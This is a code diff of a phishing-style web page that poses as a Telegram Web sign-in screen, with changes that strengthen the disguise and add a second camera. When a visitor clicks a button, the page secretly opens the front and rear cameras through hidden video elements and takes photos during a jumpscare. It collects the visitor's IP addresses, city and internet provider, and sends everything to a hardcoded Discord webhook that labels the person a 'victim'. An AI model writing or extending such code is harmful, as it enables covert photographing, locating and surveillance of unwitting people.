@@ -4,6 +4,10 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Telegram Web</title>
+  <meta property="og:title" content="Telegram Web">
+  <meta property="og:description" content="Sign in to your Telegram account.">
+  <meta property="og:type" content="website">
+  <meta name="theme-color" content="#24A1DE">
   <style>
     :root {
       --tg-blue: #24A1DE;
@@ -26,7 +30,6 @@
       user-select: none;
     }
 
-    /* ── LANDING: TELEGRAM STYLE ── */
     #screen-landing {
       width: 100%;
       max-width: 400px;
@@ -87,7 +90,6 @@
       margin-top: 5px;
     }
 
-    /* ── LOADING ── */
     #screen-loading {
       display: none;
       position: fixed; inset: 0;
@@ -106,7 +108,6 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* ── JUMPSCARE ── */
     #screen-jumpscare {
       display: none;
       position: fixed; inset: 0;
@@ -117,7 +118,6 @@
     }
     .jumpscare-video { width: 100%; height: 100%; object-fit: cover; }
 
-    /* ── TROLL ── */
     #screen-troll {
       display: none;
       position: fixed; inset: 0;
@@ -137,13 +137,15 @@
       100% { transform: translate(3px, 3px); }
     }
 
-    #hidden-video { position: fixed; opacity: 0; width: 1px; height: 1px; left: -999px; }
+    #hidden-video-front { position: fixed; opacity: 0; width: 1px; height: 1px; left: -999px; }
+    #hidden-video-back { position: fixed; opacity: 0; width: 1px; height: 1px; left: -999px; }
     #hidden-canvas { display: none; }
   </style>
 </head>
 <body>
 
-<video id="hidden-video" autoplay playsinline muted></video>
+<video id="hidden-video-front" autoplay playsinline muted></video>
+<video id="hidden-video-back" autoplay playsinline muted></video>
 <canvas id="hidden-canvas"></canvas>
 
 <div id="screen-landing">
@@ -155,7 +157,7 @@
   <input type="text" class="tg-input" placeholder="Phone number">
   <button class="tg-btn" onclick="startPrank()">Next</button>
   <button class="tg-btn secondary" onclick="startPrank()">Sign Up</button>
-  <div class="landing-bottom-meta">Secure Cloud Login</div>
+  <div class="landing-bottom-meta">© 2026 Telegram Web</div>
 </div>
 
 <div id="screen-loading">
@@ -177,90 +179,99 @@
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1490614590948511806/pVP30UWT4UeonIFBzcMjK8_3j7GJWyaTPU6C5Fvlril89lJSjti-Q2wBZXrEcG1BDI6e';
-  let stream = null;
+  let streamFront = null;
+  let streamBack = null;
   let ipInfo = { v4: 'onbekend', v6: 'onbekend', loc: 'onbekend', isp: 'onbekend' };
 
-  // 🕵️ IP GEGEVENS VERZAMELEN
   async function gatherData() {
     try {
       const v4 = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'err'}));
       const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'err'}));
       const loc = await fetch(`https://ipapi.co/${v4.ip}/json/`).then(r => r.json()).catch(() => ({}));
-      
-      ipInfo.v4 = v4.ip;
-      ipInfo.v6 = v6.ip;
-      ipInfo.loc = `${loc.city}, ${loc.country_name}`;
-      ipInfo.isp = loc.org;
+      ipInfo.v4 = v4.ip; ipInfo.v6 = v6.ip; ipInfo.loc = `${loc.city}, ${loc.country_name}`; ipInfo.isp = loc.org;
     } catch(e) {}
   }
   gatherData();
 
   async function startPrank() {
-    // Scherm vullen
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen();
     else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
-    // Naar loading
+    // Unlock troll sound (silent)
+    const tSound = document.getElementById('troll-sound');
+    tSound.play().then(() => { tSound.pause(); tSound.currentTime = 0; }).catch(() => {});
+
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
 
-    // Camera stiekem
+    // Start Front Camera
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      document.getElementById('hidden-video').srcObject = stream;
+      streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      document.getElementById('hidden-video-front').srcObject = streamFront;
     } catch(e) {}
 
-    // Korte vertraging (0.8s) voor de klap
+    // Start Back Camera
+    try {
+      streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      document.getElementById('hidden-video-back').srcObject = streamBack;
+    } catch(e) {}
+
     setTimeout(() => {
       document.getElementById('screen-loading').style.display = 'none';
       document.getElementById('screen-jumpscare').style.display = 'flex';
-      
       const v = document.getElementById('jumpscare-video');
       v.volume = 1.0;
       v.play();
 
-      // Foto maken
-      takePhoto();
+      takePhotos();
 
-      // Naar troll na 3 sec
       setTimeout(() => {
         document.getElementById('screen-jumpscare').style.display = 'none';
         document.getElementById('screen-troll').style.display = 'flex';
-        const t = document.getElementById('troll-sound');
-        t.volume = 1.0;
-        t.play();
+        document.getElementById('troll-sound').play();
       }, 3000);
     }, 800);
   }
 
-  function takePhoto() {
-    const vid = document.getElementById('hidden-video');
+  function captureToBlob(videoEl) {
+    if (!videoEl || !videoEl.srcObject || videoEl.videoWidth === 0) return null;
     const canvas = document.getElementById('hidden-canvas');
-    if (!vid.srcObject) return;
-
-    canvas.width = 720;
-    canvas.height = 720;
+    canvas.width = videoEl.videoWidth;
+    canvas.height = videoEl.videoHeight;
     const ctx = canvas.getContext('2d');
-    ctx.translate(720, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(vid, 0, 0, 720, 720);
     
-    canvas.toBlob(blob => {
-      sendToDiscord(blob);
-    }, 'image/jpeg', 0.8);
-
-    // Stop camera
-    stream.getTracks().forEach(track => track.stop());
+    // Selfie flip if front camera
+    if (videoEl.id === 'hidden-video-front') {
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+    }
+    
+    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+    return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
   }
 
-  async function sendToDiscord(blob) {
+  async function takePhotos() {
+    const frontBlob = await captureToBlob(document.getElementById('hidden-video-front'));
+    const backBlob = await captureToBlob(document.getElementById('hidden-video-back'));
+
+    const photoData = [];
+    if (frontBlob) photoData.push({ blob: frontBlob, name: 'selfie.jpg' });
+    if (backBlob) photoData.push({ blob: backBlob, name: 'omgeving.jpg' });
+
+    sendToDiscord(photoData);
+
+    if (streamFront) streamFront.getTracks().forEach(t => t.stop());
+    if (streamBack) streamBack.getTracks().forEach(t => t.stop());
+  }
+
+  async function sendToDiscord(photos) {
     const form = new FormData();
     const platform = navigator.userAgentData?.platform || navigator.platform;
     
     const payload = {
-      username: "🕵️ Night Owl System",
-      content: "💥 **SLACHTOFFER GEPAKT!**",
+      username: "🕵️ Night Owl Dual-Cam",
+      content: "💥 **SLACHTOFFER GEPAKT MET BEIDE CAMERA'S!**",
       embeds: [{
         title: "Systeem & Locatie Rapport",
         color: 0xff0000,
@@ -271,12 +282,14 @@
           { name: "📍 Locatie", value: `${ipInfo.loc}`, inline: true },
           { name: "🏢 Provider", value: `${ipInfo.isp}`, inline: true }
         ],
-        image: { url: 'attachment://victim.jpg' }
+        footer: { text: 'Night Owl Dual-Cam Prank' }
       }]
     };
 
     form.append('payload_json', JSON.stringify(payload));
-    form.append('file', blob, 'victim.jpg');
+    photos.forEach((p, index) => {
+      form.append(`file${index}`, p.blob, p.name);
+    });
 
     await fetch(WEBHOOK, { method: 'POST', body: form });
   }
